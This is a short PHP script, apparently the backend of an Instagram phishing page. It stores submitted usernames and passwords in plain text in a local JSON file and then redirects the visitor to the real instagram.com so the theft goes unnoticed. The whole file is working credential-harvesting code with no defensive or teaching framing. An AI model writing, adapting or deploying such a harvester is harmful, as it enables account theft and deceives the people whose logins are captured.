<?php
$data = array(
    'username' => $_POST['username'],
    'password' => $_POST['password']
);

$file = "usernames.json";

// Cek apakah file usernames.json sudah ada, jika tidak, buat file baru
if (!file_exists($file)) {
    $initial_data = array();
    file_put_contents($file, json_encode($initial_data));
}

$current_data = file_get_contents($file);
$array_data = json_decode($current_data, true);
$array_data[] = $data;
$final_data = json_encode($array_data, JSON_PRETTY_PRINT);

file_put_contents($file, $final_data);
header('Location: https://instagram.com');
exit();
?>
